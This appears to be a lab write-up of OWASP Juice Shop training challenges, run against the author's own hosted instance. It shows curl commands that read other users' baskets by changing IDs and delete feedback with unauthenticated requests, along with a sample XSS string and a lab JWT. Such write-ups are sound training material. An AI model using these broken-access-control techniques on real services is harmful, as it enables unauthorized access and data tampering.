# Level 2 - Easy Challenges

## Challenges

| Challenge | Description | Status |
| --- | --- | --- |
| Admin Section | Access the administration section of the store. | :heavy_minus_sign:
| Basket Access Tier 1 | View another user's shopping basket. | :white_check_mark:
| Deprecated Interface | Use a deprecated B2B interface that was not properly shut down. | :heavy_minus_sign:
| Five-Star Feedback | Get rid of all 5-star customer feedback. | :white_check_mark:
| Login Admin | Log in with the administrator's user account. | :heavy_minus_sign:
| Login MC SafeSearch | Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass. | :heavy_minus_sign:
| Password Strength | Log in with the administrator's user credentials without previously changing them or applying SQL Injection. | :heavy_minus_sign:
| Security Policy | Behave like any "white-hat" should. | :heavy_minus_sign:
| Weird Crypto | Inform the shop about an algorithm or library it should definitely not use the way it does. | :heavy_minus_sign:
| XSS Tier 1.5 | Perform an XSS attack with `<script>alert('xss')</script>` on a legacy page within the application. | :heavy_minus_sign:

## Solutions

### Admin Section

> Access the administration section of the store.

* Solved? :heavy_minus_sign:
* Tools Used: Chrome, :heavy_minus_sign:

### Basket Access Tier 1

> View another user's shopping basket.

* Solved? :white_check_mark:
* Tools Used: Chrome, Chrome Inspector, curl

First, I went to my own user's basket and noticed that it was hitting the following endpoint: `http://vanessa-owasp-juice.centralus.azurecontainer.io:3000/rest/basket/null`. Next, let's check if we can just get all baskets by removing the `null` from the end of that.

```
$ curl http://vanessa-owasp-juice.centralus.azurecontainer.io:3000/rest/basket -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJzb21lb25lQHNvbWV3aGVyZS5pbyIsInBhc3N3b3JkIjoiOTYzNDJlMzdjNDg2MmI0ZWIyMjI3NDQwZDEyOTMyNWIiLCJpc0FkbWluIjpmYWxzZSwibGFzdExvZ2luSXAiOiIxMC4yNDAuMjU1LjU1IiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMTktMDgtMTIgMTk6MTA6MzguMzgxICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTktMDgtMTQgMTU6NTg6NDMuNTE1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTU2NTc5ODMyOCwiZXhwIjoxNTY1ODE2MzI4fQ.bQY9Q8wCDH5iC4jLG6TSrQmSlGSbsXJF1SJs0_yvra_vF-XEI3ZIlRWFCpUZxXRjHxxr3WBJyiVJ6hS4p0JSl-vwOJKzWgWsU5XrGbWunoNPpfdYtf9WLaMQV5Wa5JvisTErBMfxRLpa01ebH68fy2Bedc70TmR294eiagXx1iY" -i
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Date: Wed, 14 Aug 2019 16:32:32 GMT
Connection: keep-alive
Transfer-Encoding: chunked

<html>
  <head>
    <meta charset='utf-8'>
    <title>Error: Unexpected path: /rest/basket</title>
    <style>* {
  margin: 0;
  padding: 0;
  outline: 0;
}

body {
  padding: 80px 100px;
  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
  background-repeat: no-repeat;
  color: #555;
  -webkit-font-smoothing: antialiased;
}
h1, h2 {
  font-size: 22px;
  color: #343434;
}
h1 em, h2 em {
  padding: 0 5px;
  font-weight: normal;
}
h1 {
  font-size: 60px;
}
h2 {
  margin-top: 10px;
}
ul li {
  list-style: none;
}
#stacktrace {
  margin-left: 60px;
}
</style>
  </head>
  <body>
    <div id="wrapper">
      <h1>OWASP Juice Shop (Express ^4.17.1)</h1>
      <h2><em>500</em> Error: Unexpected path: /rest/basket</h2>
      <ul id="stacktrace"><li> &nbsp; &nbsp;at /juice-shop/routes/angular.js:10:12</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)</li><li> &nbsp; &nbsp;at /juice-shop/node_modules/express/lib/router/index.js:284:7</li><li> &nbsp; &nbsp;at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:335:12)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/index.js:275:10)</li><li> &nbsp; &nbsp;at /juice-shop/routes/verify.js:153:3</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)</li><li> &nbsp; &nbsp;at /juice-shop/node_modules/express/lib/router/index.js:284:7</li><li> &nbsp; &nbsp;at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:335:12)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/index.js:275:10)</li><li> &nbsp; &nbsp;at /juice-shop/node_modules/express-jwt/lib/index.js:44:7</li><li> &nbsp; &nbsp;at Object.module.exports.verify (/juice-shop/node_modules/express-jwt/node_modules/jsonwebtoken/index.js:59:3)</li><li> &nbsp; &nbsp;at /juice-shop/node_modules/express-jwt/lib/index.js:40:9</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)</li><li> &nbsp; &nbsp;at /juice-shop/node_modules/express/lib/router/index.js:284:7</li><li> &nbsp; &nbsp;at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:335:12)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/index.js:275:10)</li><li> &nbsp; &nbsp;at /juice-shop/routes/verify.js:90:3</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)</li><li> &nbsp; &nbsp;at /juice-shop/node_modules/express/lib/router/index.js:284:7</li><li> &nbsp; &nbsp;at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:335:12)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/index.js:275:10)</li><li> &nbsp; &nbsp;at logger (/juice-shop/node_modules/morgan/index.js:144:5)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li></ul>
    </div>
  </body>
</html>
```

Not what I expected from a REST endpoint, but let's take a look at the stack trace.


<ul id="stacktrace"><li> &nbsp; &nbsp;at /juice-shop/routes/angular.js:10:12</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)</li><li> &nbsp; &nbsp;at /juice-shop/node_modules/express/lib/router/index.js:284:7</li><li> &nbsp; &nbsp;at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:335:12)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/index.js:275:10)</li><li> &nbsp; &nbsp;at /juice-shop/routes/verify.js:153:3</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)</li><li> &nbsp; &nbsp;at /juice-shop/node_modules/express/lib/router/index.js:284:7</li><li> &nbsp; &nbsp;at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:335:12)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/index.js:275:10)</li><li> &nbsp; &nbsp;at /juice-shop/node_modules/express-jwt/lib/index.js:44:7</li><li> &nbsp; &nbsp;at Object.module.exports.verify (/juice-shop/node_modules/express-jwt/node_modules/jsonwebtoken/index.js:59:3)</li><li> &nbsp; &nbsp;at /juice-shop/node_modules/express-jwt/lib/index.js:40:9</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)</li><li> &nbsp; &nbsp;at /juice-shop/node_modules/express/lib/router/index.js:284:7</li><li> &nbsp; &nbsp;at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:335:12)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/index.js:275:10)</li><li> &nbsp; &nbsp;at /juice-shop/routes/verify.js:90:3</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)</li><li> &nbsp; &nbsp;at /juice-shop/node_modules/express/lib/router/index.js:284:7</li><li> &nbsp; &nbsp;at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:335:12)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/index.js:275:10)</li><li> &nbsp; &nbsp;at logger (/juice-shop/node_modules/morgan/index.js:144:5)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li></ul>

Doesn't look too useful at the moment, but let's save that for later, in case we need to check out potentional vulnerable dependencies. Now, let's just try putting a number at the end of the Basket REST endpoint instead of null.

```
$ curl http://vanessa-owasp-juice.centralus.azurecontainer.io:3000/rest/basket/1 -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJzb21lb25lQHNvbWV3aGVyZS5pbyIsInBhc3N3b3JkIjoiOTYzNDJlMzdjNDg2MmI0ZWIyMjI3NDQwZDEyOTMyNWIiLCJpc0FkbWluIjpmYWxzZSwibGFzdExvZ2luSXAiOiIxMC4yNDAuMjU1LjU1IiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMTktMDgtMTIgMTk6MTA6MzguMzgxICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTktMDgtMTQgMTU6NTg6NDMuNTE1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTU2NTc5ODMyOCwiZXhwIjoxNTY1ODE2MzI4fQ.bQY9Q8wCDH5iC4jLG6TSrQmSlGSbsXJF1SJs0_yvra_vF-XEI3ZIlRWFCpUZxXRjHxxr3WBJyiVJ6hS4p0JSl-vwOJKzWgWsU5XrGbWunoNPpfdYtf9WLaMQV5Wa5JvisTErBMfxRLpa01ebH68fy2Bedc70TmR294eiagXx1iY"
{"status":"success","data":{"id":1,"coupon":null,"createdAt":"2019-08-12T18:38:37.058Z","updatedAt":"2019-08-12T18:38:37.058Z","UserId":1,"Products":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"image":"apple_juice.jpg","createdAt":"2019-08-12T18:38:32.978Z","updatedAt":"2019-08-12T18:38:32.978Z","deletedAt":null,"BasketItem":{"id":1,"quantity":2,"createdAt":"2019-08-12T18:38:37.059Z","updatedAt":"2019-08-12T18:38:37.059Z","BasketId":1,"ProductId":1}},{"id":2,"name":"Orange Juice (1000ml)","description":"Made from oranges hand-picked by Uncle Dittmeyer.","price":2.99,"image":"orange_juice.jpg","createdAt":"2019-08-12T18:38:32.978Z","updatedAt":"2019-08-12T18:38:32.978Z","deletedAt":null,"BasketItem":{"id":2,"quantity":3,"createdAt":"2019-08-12T18:38:37.059Z","updatedAt":"2019-08-12T18:38:37.059Z","BasketId":1,"ProductId":2}},{"id":3,"name":"Eggfruit Juice (500ml)","description":"Now with even more exotic flavour.","price":8.99,"image":"eggfruit_juice.jpg","createdAt":"2019-08-12T18:38:32.978Z","updatedAt":"2019-08-12T18:38:32.978Z","deletedAt":null,"BasketItem":{"id":3,"quantity":1,"createdAt":"2019-08-12T18:38:37.059Z","updatedAt":"2019-08-12T18:38:37.059Z","BasketId":1,"ProductId":3}}]}}%   
                                                                                                                                                                                                        [11:36:28 AM CDT ] 
$ curl http://vanessa-owasp-juice.centralus.azurecontainer.io:3000/rest/basket/2 -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJzb21lb25lQHNvbWV3aGVyZS5pbyIsInBhc3N3b3JkIjoiOTYzNDJlMzdjNDg2MmI0ZWIyMjI3NDQwZDEyOTMyNWIiLCJpc0FkbWluIjpmYWxzZSwibGFzdExvZ2luSXAiOiIxMC4yNDAuMjU1LjU1IiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMTktMDgtMTIgMTk6MTA6MzguMzgxICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTktMDgtMTQgMTU6NTg6NDMuNTE1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTU2NTc5ODMyOCwiZXhwIjoxNTY1ODE2MzI4fQ.bQY9Q8wCDH5iC4jLG6TSrQmSlGSbsXJF1SJs0_yvra_vF-XEI3ZIlRWFCpUZxXRjHxxr3WBJyiVJ6hS4p0JSl-vwOJKzWgWsU5XrGbWunoNPpfdYtf9WLaMQV5Wa5JvisTErBMfxRLpa01ebH68fy2Bedc70TmR294eiagXx1iY"
{"status":"success","data":{"id":2,"coupon":null,"createdAt":"2019-08-12T18:38:37.058Z","updatedAt":"2019-08-12T18:38:37.058Z","UserId":2,"Products":[{"id":4,"name":"Raspberry Juice (1000ml)","description":"Made from blended Raspberry Pi, water and sugar.","price":4.99,"image":"raspberry_juice.jpg","createdAt":"2019-08-12T18:38:32.978Z","updatedAt":"2019-08-12T18:38:32.978Z","deletedAt":null,"BasketItem":{"id":4,"quantity":2,"createdAt":"2019-08-12T18:38:37.059Z","updatedAt":"2019-08-12T18:38:37.059Z","BasketId":2,"ProductId":4}}]}}%
```

Yep, no authorization again. It just assumes that if I provide an authentication token, that the request is legit. Solved.

<img src="images/2-basket-solved.png">

### Deprecated Interface

> Use a deprecated B2B interface that was not properly shut down.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:

### Five-Star Feedback

> Get rid of all 5-star customer feedback.

* Solved? :white_check_mark:
* Tools Used: Chrome, Chrome Inspector, curl


All I had to do for this challenge was find the feedback endpoint (which was `http://vanessa-owasp-juice.centralus.azurecontainer.io:3000/api/Feedbacks`), and test out of few requests to it. First, I got all feedback, to see what info I could get out of it.

```
$ curl http://vanessa-owasp-juice.centralus.azurecontainer.io:3000/api/Feedbacks -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJzb21lb25lQHNvbWV3aGVyZS5pbyIsInBhc3N3b3JkIjoiOTYzNDJlMzdjNDg2MmI0ZWIyMjI3NDQwZDEyOTMyNWIiLCJpc0FkbWluIjpmYWxzZSwibGFzdExvZ2luSXAiOiIxMC4yNDAuMjU1LjU1IiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMTktMDgtMTIgMTk6MTA6MzguMzgxICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTktMDgtMTQgMTU6NTg6NDMuNTE1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTU2NTc5ODMyOCwiZXhwIjoxNTY1ODE2MzI4fQ.bQY9Q8wCDH5iC4jLG6TSrQmSlGSbsXJF1SJs0_yvra_vF-XEI3ZIlRWFCpUZxXRjHxxr3WBJyiVJ6hS4p0JSl-vwOJKzWgWsU5XrGbWunoNPpfdYtf9WLaMQV5Wa5JvisTErBMfxRLpa01ebH68fy2Bedc70TmR294eiagXx1iY" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1331  100  1331    0     0   7950      0 --:--:-- --:--:-- --:--:--  7970
{
  "status": "success",
  "data": [
    {
      "id": 1,
      "comment": "",
      "rating": 5,
      "createdAt": "2019-08-12T18:38:22.182Z",
      "updatedAt": "2019-08-12T18:38:22.182Z",
      "UserId": 1
    },
    {
      "id": 2,
      "comment": "Great shop! Awesome service!",
      "rating": 4,
      "createdAt": "2019-08-12T18:38:22.320Z",
      "updatedAt": "2019-08-12T18:38:22.320Z",
      "UserId": 2
    },
    {
      "id": 3,
      "comment": "Nothing useful available here!",
      "rating": 1,
      "createdAt": "2019-08-12T18:38:22.460Z",
      "updatedAt": "2019-08-12T18:38:22.460Z",
      "UserId": 3
    },
    {
      "id": 4,
      "comment": "Incompetent customer support! Can't even upload photo of broken purchase!<br /><em>Support Team: Sorry, only order confirmation PDFs can be attached to complaints!</em>",
      "rating": 2,
      "createdAt": "2019-08-12T18:38:37.060Z",
      "updatedAt": "2019-08-12T18:38:37.060Z",
      "UserId": null
    },
    {
      "id": 5,
      "comment": "This is <b>the</b> store for awesome stuff of all kinds!",
      "rating": 4,
      "createdAt": "2019-08-12T18:38:37.061Z",
      "updatedAt": "2019-08-12T18:38:37.061Z",
      "UserId": null
    },
    {
      "id": 6,
      "comment": "Never gonna buy anywhere else from now on! Thanks for the great service!",
      "rating": 4,
      "createdAt": "2019-08-12T18:38:37.061Z",
      "updatedAt": "2019-08-12T18:38:37.061Z",
      "UserId": null
    },
    {
      "id": 7,
      "comment": "Keep up the good work!",
      "rating": 3,
      "createdAt": "2019-08-12T18:38:37.061Z",
      "updatedAt": "2019-08-12T18:38:37.061Z",
      "UserId": null
    }
  ]
}
```

The nice thing about REST-based APIs is that its pretty easy to assume the format to get, modify, or delete data. So, using the ID, I made a HTTP delete request to `http://vanessa-owasp-juice.centralus.azurecontainer.io:3000/api/Feedbacks/1`, and got back the following:

{"status":"success","data":{}}

Looks like they don't do any authorization checks when they get a delete request. And when I logged back into the scoreboard, I found this waiting for me.

<img src="images/2-feedback-solved.png">

Solved!

*Side note: I also noticed that, in the feedback comment for feedback ID `4`, it looks like there is HTML being returned from the API. Might be useful in a later challenge!*

### Login Admin

> Log in with the administrator's user account.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:

### Login MC SafeSearch

> Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:

### Password Strength

> Log in with the administrator's user credentials without previously changing them or applying SQL Injection.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:

### Security Policy

> Behave like any "white-hat" should.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:

### Weird Crypto

> Inform the shop about an algorithm or library it should definitely not use the way it does.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:

### XSS Tier 1.5

> Perform an XSS attack with `<script>alert('xss')</script>` on a legacy page within the application.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign: